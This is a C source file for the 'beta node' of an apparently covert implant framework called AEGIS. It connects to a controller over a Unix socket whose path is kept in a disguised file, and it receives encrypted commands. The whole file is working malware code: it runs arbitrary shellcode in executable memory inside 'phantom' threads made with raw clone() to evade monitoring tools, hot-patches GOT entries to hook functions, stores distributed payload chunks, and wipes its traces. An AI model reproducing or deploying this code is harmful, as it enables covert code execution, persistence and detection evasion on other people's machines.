/*
 * ============================================================================
 *  AEGIS FRAMEWORK — Beta Node (Command Receiver & Executor)
 * ============================================================================
 *  Classification : PRIVATE — LO/ENI EYES ONLY
 *  Component      : nexus_auditor/beta_node.c
 *  Purpose        : Beta nodes are all processes loaded AFTER the Alpha.
 *                   They connect to the Alpha's IPC socket, send periodic
 *                   heartbeats, and execute commands received from the Alpha:
 *
 *                   - Execute arbitrary shellcode in new threads
 *                   - Perform live GOT/PLT hooking
 *                   - Store distributed payload chunks
 *                   - Participate in process migration
 *
 *  Key Technique  : Shellcode execution via mmap(PROT_EXEC) in phantom
 *                   threads (clone() without pthread registration).
 * ============================================================================
 */

#define _GNU_SOURCE 1

#include "../c2_comms/crypto.h"
#include "../common/config.h"
#include "../common/logging.h"
#include "../common/types.h"
#include "ipc_protocol.h"


#include <dlfcn.h>
#include <errno.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>


/* ── Forward Declaration from nexus_auditor.c ────────────────────────────── */

extern aegis_result_t nexus_register_hook(const char *lib, const char *func,
                                          void *hook_addr);
extern aegis_result_t nexus_remove_hook(const char *lib, const char *func);
extern aegis_result_t nexus_hot_patch_got(const char *lib, const char *func,
                                          void *hook_addr);

/* ── Global State ────────────────────────────────────────────────────────── */

static aegis_log_ctx_t *g_beta_log = NULL;
static aegis_crypto_ctx_t *g_beta_crypto = NULL;
static int g_client_fd = -1;
static volatile bool g_beta_running = false;
static pthread_t g_heartbeat_thread;
static pthread_t g_receiver_thread;

/* Distributed chunk storage */
#define MAX_STORED_CHUNKS 64

typedef struct {
  uint32_t chunk_id;
  uint8_t *data;
  size_t data_len;
  bool occupied;
} stored_chunk_t;

static stored_chunk_t g_chunks[MAX_STORED_CHUNKS];
static pthread_mutex_t g_chunk_mutex = PTHREAD_MUTEX_INITIALIZER;

/* ── Internal: Connect to Alpha's IPC Socket ─────────────────────────────── */

static aegis_result_t connect_to_alpha(void) {
  const char *home = getenv("HOME");
  if (!home)
    return AEGIS_ERR_IPC;

  /* Read the socket path from the discoverable location */
  char sock_info_path[512];
  snprintf(sock_info_path, sizeof(sock_info_path), "%s/.cache/.dbus-info",
           home);

  FILE *f = fopen(sock_info_path, "r");
  if (!f)
    return AEGIS_ERR_IPC;

  char sock_path[512] = {0};
  if (!fgets(sock_path, sizeof(sock_path), f)) {
    fclose(f);
    return AEGIS_ERR_IPC;
  }
  fclose(f);

  /* Strip newline */
  char *nl = strchr(sock_path, '\n');
  if (nl)
    *nl = '\0';

  g_client_fd = socket(AF_UNIX, SOCK_STREAM, 0);
  if (g_client_fd < 0)
    return AEGIS_ERR_SYSCALL;

  struct sockaddr_un addr;
  memset(&addr, 0, sizeof(addr));
  addr.sun_family = AF_UNIX;
  snprintf(addr.sun_path, sizeof(addr.sun_path), "%.107s", sock_path);

  if (connect(g_client_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
    close(g_client_fd);
    g_client_fd = -1;
    return AEGIS_ERR_IPC;
  }

  aegis_log_event(g_beta_log, LOG_CAT_BETA, LOG_SEV_INFO,
                  "Connected to Alpha IPC: %s", sock_path);

  return AEGIS_OK;
}

/* ── Internal: Send IPC Message ──────────────────────────────────────────── */

static aegis_result_t beta_send_message(aegis_ipc_cmd_t cmd,
                                        const uint8_t *payload, size_t len) {
  if (g_client_fd < 0)
    return AEGIS_ERR_IPC;

  aegis_ipc_header_t hdr;
  memset(&hdr, 0, sizeof(hdr));
  hdr.magic = IPC_MAGIC;
  hdr.command = (uint16_t)cmd;

  if (payload && len > 0) {
    uint8_t *ct = malloc(len);
    if (!ct)
      return AEGIS_ERR_ALLOC;

    aegis_result_t rc =
        aegis_encrypt(g_beta_crypto, payload, len, (const uint8_t *)&hdr,
                      offsetof(aegis_ipc_header_t, iv), ct, hdr.iv, hdr.tag);
    if (rc != AEGIS_OK) {
      free(ct);
      return rc;
    }

    hdr.payload_len = (uint32_t)len;
    send(g_client_fd, &hdr, sizeof(hdr), MSG_NOSIGNAL);
    send(g_client_fd, ct, len, MSG_NOSIGNAL);
    free(ct);
  } else {
    hdr.payload_len = 0;
    send(g_client_fd, &hdr, sizeof(hdr), MSG_NOSIGNAL);
  }

  return AEGIS_OK;
}

/* ── Internal: Phantom Thread via raw clone() ────────────────────────────── */

/*
 * Phantom threads are spawned via the clone() syscall directly,
 * bypassing pthread entirely.  This means they don't appear in
 * pthread_list, are invisible to libraries that enumerate threads
 * via pthread, and are harder to detect via /proc/self/task
 * (they exist there, but their creation doesn't trigger the usual
 * pthread hooks that monitoring tools watch).
 */

#define PHANTOM_STACK_SIZE (1 << 16) /* 64 KB */

typedef struct {
  void *code;
  size_t code_len;
  void *exec_region;
} phantom_ctx_t;

static int phantom_entry(void *arg) {
  phantom_ctx_t *ctx = (phantom_ctx_t *)arg;

  /*
   * The executing code was already placed in an mmap'd PROT_EXEC region.
   * Cast and call it.
   */
  typedef void (*shellcode_fn)(void);
  shellcode_fn fn = (shellcode_fn)ctx->exec_region;
  fn();

  /* Clean up: secure wipe and unmap */
  AEGIS_WIPE(ctx->exec_region, ctx->code_len, 3);
  munmap(ctx->exec_region, ctx->code_len);

  free(ctx);
  return 0;
}

static aegis_result_t execute_shellcode_phantom(const uint8_t *shellcode,
                                                size_t len) {
  /* Allocate executable memory */
  size_t alloc_len = AEGIS_PAGE_ALIGN(len);
  void *exec_region = mmap(NULL, alloc_len, PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (exec_region == MAP_FAILED)
    return AEGIS_ERR_MMAP;

  /* Copy shellcode */
  memcpy(exec_region, shellcode, len);

  /* Make executable (RX, no write) */
  if (mprotect(exec_region, alloc_len, PROT_READ | PROT_EXEC) != 0) {
    munmap(exec_region, alloc_len);
    return AEGIS_ERR_MPROTECT;
  }

  aegis_log_memory_map(g_beta_log, "mmap+mprotect", exec_region, alloc_len,
                       PROT_READ | PROT_WRITE, PROT_READ | PROT_EXEC,
                       "shellcode execution region");

  /* Prepare phantom thread context */
  phantom_ctx_t *ctx = malloc(sizeof(phantom_ctx_t));
  if (!ctx) {
    munmap(exec_region, alloc_len);
    return AEGIS_ERR_ALLOC;
  }
  ctx->code = (void *)shellcode;
  ctx->code_len = alloc_len;
  ctx->exec_region = exec_region;

  /* Allocate stack for the phantom thread */
  void *stack = mmap(NULL, PHANTOM_STACK_SIZE, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
  if (stack == MAP_FAILED) {
    free(ctx);
    munmap(exec_region, alloc_len);
    return AEGIS_ERR_MMAP;
  }

  /* clone() — create a thread that is invisible to pthread */
  void *stack_top = (char *)stack + PHANTOM_STACK_SIZE;
  int flags = CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND | CLONE_THREAD |
              CLONE_SYSVSEM;

  long ret = clone(phantom_entry, stack_top, flags, ctx);
  if (ret < 0) {
    free(ctx);
    munmap(exec_region, alloc_len);
    munmap(stack, PHANTOM_STACK_SIZE);
    return AEGIS_ERR_SYSCALL;
  }

  aegis_log_transform(g_beta_log, LOG_CAT_BETA, "phantom_thread_spawned",
                      "shellcode", NULL, exec_region, len,
                      "Phantom thread spawned via clone() "
                      "(tid=%ld, stack=%p, code=%p)",
                      ret, stack_top, exec_region);

  return AEGIS_OK;
}

/* ── Internal: Handle Commands from Alpha ────────────────────────────────── */

static void handle_alpha_command(aegis_ipc_header_t *hdr, uint8_t *payload,
                                 size_t payload_len) {
  switch (hdr->command) {

  case CMD_EXEC_SHELLCODE: {
    if (payload_len < sizeof(ipc_exec_shellcode_t))
      break;

    ipc_exec_shellcode_t *cmd = (ipc_exec_shellcode_t *)payload;

    /* Check if this is targeted at us or broadcast */
    if (cmd->target_pid != 0 && cmd->target_pid != getpid())
      break;

    aegis_log_event(g_beta_log, LOG_CAT_BETA, LOG_SEV_INFO,
                    "Executing shellcode (%u bytes) via phantom thread",
                    cmd->shellcode_len);

    execute_shellcode_phantom(cmd->shellcode, cmd->shellcode_len);
    break;
  }

  case CMD_HOOK_FUNCTION: {
    if (payload_len < sizeof(ipc_hook_function_t))
      break;

    ipc_hook_function_t *cmd = (ipc_hook_function_t *)payload;

    if (cmd->target_pid != 0 && cmd->target_pid != getpid())
      break;

    aegis_log_event(g_beta_log, LOG_CAT_BETA, LOG_SEV_INFO,
                    "Hook command: %s::%s -> %s", cmd->target_lib,
                    cmd->target_func, cmd->redirect_to);

    /*
     * Look up the redirect function within our own loaded code.
     * The hook implementations are compiled into the auditor .so.
     */
    void *hook_fn = dlsym(RTLD_DEFAULT, cmd->redirect_to);
    if (hook_fn) {
      /* First, register for future la_symbind64 interception */
      nexus_register_hook(cmd->target_lib, cmd->target_func, hook_fn);

      /* Then, hot-patch the GOT for already-resolved symbols */
      nexus_hot_patch_got(cmd->target_lib, cmd->target_func, hook_fn);
    } else {
      aegis_log_event(g_beta_log, LOG_CAT_BETA, LOG_SEV_ERROR,
                      "Hook redirect function not found: %s", cmd->redirect_to);
    }
    break;
  }

  case CMD_UNHOOK_FUNCTION: {
    if (payload_len < sizeof(ipc_unhook_function_t))
      break;

    ipc_unhook_function_t *cmd = (ipc_unhook_function_t *)payload;

    if (cmd->target_pid != 0 && cmd->target_pid != getpid())
      break;

    nexus_remove_hook(cmd->target_lib, cmd->target_func);
    break;
  }

  case CMD_DISTRIBUTE_CHUNK: {
    if (payload_len < sizeof(ipc_distribute_chunk_t))
      break;

    ipc_distribute_chunk_t *cmd = (ipc_distribute_chunk_t *)payload;

    pthread_mutex_lock(&g_chunk_mutex);

    /* Find a free slot */
    int slot = -1;
    for (int i = 0; i < MAX_STORED_CHUNKS; i++) {
      if (!g_chunks[i].occupied) {
        slot = i;
        break;
      }
    }

    if (slot >= 0) {
      g_chunks[slot].chunk_id = cmd->chunk_id;
      g_chunks[slot].data_len = cmd->chunk_len;
      g_chunks[slot].data = malloc(cmd->chunk_len);
      if (g_chunks[slot].data) {
        memcpy(g_chunks[slot].data, cmd->data, cmd->chunk_len);
        g_chunks[slot].occupied = true;

        aegis_log_event(g_beta_log, LOG_CAT_VAULT, LOG_SEV_INFO,
                        "Stored payload chunk %u/%u (%u bytes)", cmd->chunk_id,
                        cmd->total_chunks, cmd->chunk_len);
      }
    }

    pthread_mutex_unlock(&g_chunk_mutex);
    break;
  }

  case CMD_COLLECT_CHUNK: {
    if (payload_len < sizeof(ipc_collect_chunk_req_t))
      break;

    ipc_collect_chunk_req_t *req = (ipc_collect_chunk_req_t *)payload;

    pthread_mutex_lock(&g_chunk_mutex);

    for (int i = 0; i < MAX_STORED_CHUNKS; i++) {
      if (g_chunks[i].occupied && g_chunks[i].chunk_id == req->chunk_id) {

        /* Send the chunk back to Alpha */
        size_t resp_size =
            sizeof(ipc_collect_chunk_resp_t) + g_chunks[i].data_len;
        uint8_t *resp = malloc(resp_size);
        if (resp) {
          ipc_collect_chunk_resp_t *r = (ipc_collect_chunk_resp_t *)resp;
          r->chunk_id = g_chunks[i].chunk_id;
          r->chunk_len = (uint32_t)g_chunks[i].data_len;
          memcpy(r->data, g_chunks[i].data, g_chunks[i].data_len);

          beta_send_message(CMD_COLLECT_CHUNK, resp, resp_size);
          free(resp);
        }
        break;
      }
    }

    pthread_mutex_unlock(&g_chunk_mutex);
    break;
  }

  case CMD_REKEY: {
    if (payload_len < sizeof(ipc_rekey_t))
      break;

    aegis_log_event(g_beta_log, LOG_CAT_CRYPTO, LOG_SEV_INFO,
                    "Rekey command received from Alpha");
    aegis_rekey(g_beta_crypto);
    break;
  }

  case CMD_TERMINATE: {
    aegis_log_event(g_beta_log, LOG_CAT_BETA, LOG_SEV_WARN,
                    "TERMINATE command received — cleaning up");

    /* Wipe all stored chunks */
    pthread_mutex_lock(&g_chunk_mutex);
    for (int i = 0; i < MAX_STORED_CHUNKS; i++) {
      if (g_chunks[i].occupied && g_chunks[i].data) {
        AEGIS_WIPE(g_chunks[i].data, g_chunks[i].data_len, 3);
        free(g_chunks[i].data);
        g_chunks[i].data = NULL;
        g_chunks[i].occupied = false;
      }
    }
    pthread_mutex_unlock(&g_chunk_mutex);

    g_beta_running = false;
    break;
  }

  default:
    aegis_log_event(g_beta_log, LOG_CAT_BETA, LOG_SEV_WARN,
                    "Unknown command from Alpha: 0x%04x", hdr->command);
    break;
  }
}

/* ── Thread: Command Receiver ────────────────────────────────────────────── */

static void *receiver_thread(void *arg) {
  (void)arg;

  while (g_beta_running) {
    struct pollfd pfd = {
        .fd = g_client_fd,
        .events = POLLIN,
    };

    int ret = poll(&pfd, 1, 1000);
    if (ret <= 0)
      continue;

    if (pfd.revents & POLLIN) {
      aegis_ipc_header_t hdr;
      ssize_t n = recv(g_client_fd, &hdr, sizeof(hdr), MSG_WAITALL);
      if (n != sizeof(hdr)) {
        /* Connection lost — try to reconnect */
        close(g_client_fd);
        g_client_fd = -1;

        struct timespec ts = {.tv_sec = 5, .tv_nsec = 0};
        nanosleep(&ts, NULL);

        if (connect_to_alpha() != AEGIS_OK) {
          aegis_log_event(g_beta_log, LOG_CAT_BETA, LOG_SEV_ERROR,
                          "Reconnection to Alpha failed");
        }
        continue;
      }

      if (hdr.magic != IPC_MAGIC)
        continue;

      uint8_t *payload = NULL;
      if (hdr.payload_len > 0 && hdr.payload_len <= AEGIS_IPC_MAX_MSG_SIZE) {

        uint8_t *ct = malloc(hdr.payload_len);
        if (!ct)
          continue;

        n = recv(g_client_fd, ct, hdr.payload_len, MSG_WAITALL);
        if (n != (ssize_t)hdr.payload_len) {
          free(ct);
          continue;
        }

        payload = malloc(hdr.payload_len);
        if (!payload) {
          free(ct);
          continue;
        }

        aegis_result_t rc = aegis_decrypt(
            g_beta_crypto, ct, hdr.payload_len, (const uint8_t *)&hdr,
            offsetof(aegis_ipc_header_t, iv), hdr.iv, hdr.tag, payload);
        free(ct);
        if (rc != AEGIS_OK) {
          free(payload);
          continue;
        }
      }

      handle_alpha_command(&hdr, payload, hdr.payload_len);
      free(payload);
    }
  }

  return NULL;
}

/* ── Thread: Heartbeat Sender ────────────────────────────────────────────── */

static void *heartbeat_sender_thread(void *arg) {
  (void)arg;

  while (g_beta_running) {
    if (g_client_fd >= 0) {
      ipc_heartbeat_t hb;
      memset(&hb, 0, sizeof(hb));
      hb.pid = getpid();
      hb.tid = (uint32_t)gettid();
      hb.uptime_ns = aegis_timestamp_ns();
      hb.status = 1; /* Active */

      beta_send_message(CMD_HEARTBEAT, (const uint8_t *)&hb, sizeof(hb));
    }

    struct timespec ts = {.tv_sec = AEGIS_IPC_HEARTBEAT_SEC, .tv_nsec = 0};
    nanosleep(&ts, NULL);
  }

  return NULL;
}

/* ── Public: Start / Stop ────────────────────────────────────────────────── */

aegis_result_t beta_node_start(aegis_log_ctx_t *log,
                               aegis_crypto_ctx_t *crypto) {
  g_beta_log = log;
  g_beta_crypto = crypto;

  memset(g_chunks, 0, sizeof(g_chunks));

  aegis_log_event(g_beta_log, LOG_CAT_BETA, LOG_SEV_INFO,
                  "=== Beta Node initializing (pid=%d, comm=%s) ===",
                  (int)getpid(), program_invocation_short_name);

  /* Connect to Alpha */
  aegis_result_t rc = connect_to_alpha();
  if (rc != AEGIS_OK) {
    aegis_log_event(g_beta_log, LOG_CAT_BETA, LOG_SEV_WARN,
                    "Cannot connect to Alpha (rc=%d) — "
                    "entering dormant mode",
                    rc);
    return rc; /* Not fatal — Beta can retry later */
  }

  g_beta_running = true;

  /* Start worker threads */
  pthread_create(&g_receiver_thread, NULL, receiver_thread, NULL);
  pthread_create(&g_heartbeat_thread, NULL, heartbeat_sender_thread, NULL);

  pthread_detach(g_receiver_thread);
  pthread_detach(g_heartbeat_thread);

  aegis_log_event(g_beta_log, LOG_CAT_BETA, LOG_SEV_INFO,
                  "Beta Node operational: receiver=active, "
                  "heartbeat=active");

  return AEGIS_OK;
}

void beta_node_stop(void) {
  g_beta_running = false;

  /* Wipe stored chunks */
  pthread_mutex_lock(&g_chunk_mutex);
  for (int i = 0; i < MAX_STORED_CHUNKS; i++) {
    if (g_chunks[i].occupied && g_chunks[i].data) {
      AEGIS_WIPE(g_chunks[i].data, g_chunks[i].data_len, 3);
      free(g_chunks[i].data);
      g_chunks[i].data = NULL;
      g_chunks[i].occupied = false;
    }
  }
  pthread_mutex_unlock(&g_chunk_mutex);

  if (g_client_fd >= 0) {
    close(g_client_fd);
    g_client_fd = -1;
  }

  aegis_log_event(g_beta_log, LOG_CAT_BETA, LOG_SEV_INFO, "Beta Node stopped");
}
